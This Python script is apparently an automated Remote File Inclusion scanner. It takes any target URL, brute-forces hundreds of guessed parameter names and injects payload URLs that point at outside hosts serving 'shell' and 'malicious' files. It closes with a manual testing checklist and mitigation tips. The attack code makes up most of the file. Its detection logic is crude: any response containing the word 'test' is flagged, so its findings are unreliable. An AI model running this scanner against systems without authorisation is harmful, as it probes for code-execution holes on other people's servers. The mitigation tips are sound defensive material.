import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

def guess_params(params):
    if not params:
        common_params = [
    "id", "page", "user", "search", "q", "file", "path", "folder", "document", "dir",
    "cat", "category", "item", "name", "product", "lang", "lang_id", "sort", "order",
    "type", "view", "action", "filter", "token", "session", "sid", "ref", "redirect",
    "url", "next", "page_id", "start", "limit", "offset", "count", "email", "username",
    "password", "passwd", "login", "logout", "submit", "query", "content", "topic",
    "thread", "post", "comment", "id_user", "user_id", "uid", "pid", "cid", "aid",
    "img", "image", "photo", "thumb", "size", "width", "height", "color", "lang_code",
    "lang_id", "lang_name", "lang_iso", "locale", "date", "time", "datetime", "timestamp",
    "debug", "test", "mode", "level", "page_num", "page_no", "num", "number", "limit",
    "offset", "offset_start", "keyword", "search_term", "search_query", "category_id",
    "cat_id", "tag", "tag_id", "product_id", "prod_id", "order_id", "session_id",
    "cart_id", "token_id", "csrf_token", "auth_token", "access_token", "api_key",
    "apikey", "client_id", "client_secret", "callback", "format", "json", "xml", "html",
    "download", "file_name", "filename", "filetype", "ext", "extension", "version",
    "v", "lang_iso", "lang_code", "lang_key", "sort_by", "sort_order", "asc", "desc",
    "page_size", "rows", "per_page", "perpage", "max", "min", "price_min", "price_max",
    "rating", "review", "user_agent", "ua", "referer", "referrer", "utm_source",
    "utm_medium", "utm_campaign", "utm_term", "utm_content", "click_id", "tracking_id",
    "session_key", "session_token", "device", "platform", "os", "browser", "ip",
    "location", "city", "country", "region", "state", "zip", "postal_code", "lat", "lon",
    "latitude", "longitude", "debug_mode", "test_mode", "env", "environment", "langId",
    "categoryName", "subcat", "subcategory", "productName", "product_code", "sku",
    "barcode", "brand", "manufacturer", "supplier", "vendor", "order_date", "date_from",
    "date_to", "start_date", "end_date", "from", "to", "pageIndex", "pageNumber",
    "pagecount", "pageCount", "limitStart", "limitEnd", "cursor", "token_value",
    "auth_key", "authcode", "auth_code", "password_reset", "reset_token", "resetcode",
    "verify_token", "activation_code", "activation_token", "code", "key", "id_code",
    "ref_code", "promo_code", "coupon_code", "discount_code", "amount", "total",
    "subtotal", "tax", "shipping", "discount", "fee", "currency", "curr", "country_code",
    "langId", "langId", "lang_id", "langid", "default_lang", "language", "lang_code",
    "langKey", "isAdmin", "is_admin", "admin", "admin_id", "admin_user", "role", "roles",
    "permission", "permissions", "access", "access_level", "level", "status", "state",
    "active", "inactive", "enabled", "disabled", "visible", "hidden", "flag", "flags",
    "page_title", "title", "description", "desc", "summary", "keywords", "meta",
    "meta_title", "meta_description", "meta_keywords", "header", "footer", "sidebar",
    "content_id", "content_type", "post_id", "blog_id", "article_id", "news_id",
    "event_id", "calendar_id", "task_id", "ticket_id", "case_id", "issue_id", "bug_id",
    "error_id", "log_id", "message_id", "thread_id", "conversation_id", "chat_id",
    "session_id", "connection_id", "device_id", "hardware_id", "software_id", "profile_id",
    "account_id", "client_id", "customer_id", "member_id", "subscriber_id", "visitor_id",
    "guest_id", "usergroup", "group_id", "team_id", "project_id", "workspace_id",
    "folder_id", "directory", "path", "filepath", "filename", "file", "image_id",
    "photo_id", "video_id", "audio_id", "media_id", "attachment_id", "resource_id",
    "link", "url", "redirect_url", "return_url", "callback_url", "next_url", "prev_url",
    "referer_url", "target_url", "origin_url", "source_url", "destination_url",
    "host", "hostname", "domain", "subdomain", "port", "protocol", "scheme", "api_version",
    "api_key", "api_secret", "api_token", "access_token", "refresh_token", "jwt",
    "auth_token", "auth_code", "auth_key", "session_token", "cookie", "cookie_id",
    "remember_me", "keep_logged_in", "login_token", "nonce", "timestamp", "date",
    "time", "datetime", "expiry", "expire", "expires", "valid_until", "start_time",
    "end_time", "limit", "offset", "page", "per_page", "perpage", "size", "length",
    "width", "height", "depth", "weight", "color", "background_color", "font_size",
    "font_family", "font_weight", "line_height", "letter_spacing", "text_align",
    "text_decoration", "visibility", "display", "position", "top", "left", "right",
    "bottom", "margin", "padding", "border", "radius", "opacity", "z_index", "order",
    "flex", "grid", "align", "justify", "content", "items", "self", "overflow",
    "cursor", "pointer_events", "resize", "box_shadow", "transition", "animation",
    "transform", "filter", "backdrop_filter", "user_select", "pointer_events", "zoom",
    "columns", "rows", "gap", "column_gap", "row_gap", "grid_template", "grid_area",
    "grid_row", "grid_column", "place_items", "place_content", "place_self"
]

        params = {p: [''] for p in common_params}
    return params

def print_manual_testing_guide():
    print(Fore.CYAN + "\n=== Manual RFI Testing Checklist ===")
    print("""
1. Identify vulnerable parameters by injecting URLs to remote files you control.
   Example: http://target.com/page?extension=http://example.com/test.txt
2. Check server responses for inclusion of the remote file content.
3. Test with different payloads (remote URLs or local files).
4. Use URL encoding to bypass simple filters.
5. Observe HTTP responses and errors for clues.
""")

def print_mitigation_guide():
    print(Fore.CYAN + "\n=== RFI Mitigation Tips ===")
    print("""
1. Disable remote file inclusion (e.g., 'allow_url_include=Off' in PHP).
2. Validate and sanitize all user inputs; use whitelists.
3. Avoid including files directly from user input.
4. Reject inputs containing URL schemes or directory traversal.
5. Use a Web Application Firewall (WAF) to detect/block RFI.
6. Properly handle errors and log suspicious activity.
""")

def run():
    print(Fore.CYAN + "Running Remote File Inclusion (RFI) scan with automatic parameter detection...\n")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    # Example payloads pointing to remote test files you control
    payloads = [
        # example.com test files
        "http://example.com/test1.txt",
        "http://example.com/test2.txt",
        "http://example.com/test3.txt",
        # ... (all the way to 100)
        *[f"http://example.com/test{i}.txt" for i in range(1, 101)],
        
        # test.com shell files
        *[f"http://test.com/shell{i}.txt" for i in range(1, 101)],

        # yourserver.com malicious files
        *[f"http://yourserver.com/malicious{i}.txt" for i in range(1, 101)]
    ]

    vulnerable_params = []

    for param in params:
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                res = requests.get(test_url, timeout=5)
                # Simplistic check: look for the word 'test' or common file content in response
                if "test" in res.text.lower():
                    print(Fore.RED + f"[!] RFI vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] Request error for parameter '{param}': {e}")

        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No RFI detected in parameter: {param}")

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for RFI.")
    else:
        print_manual_testing_guide()
        print_mitigation_guide()

if __name__ == "__main__":
    run()
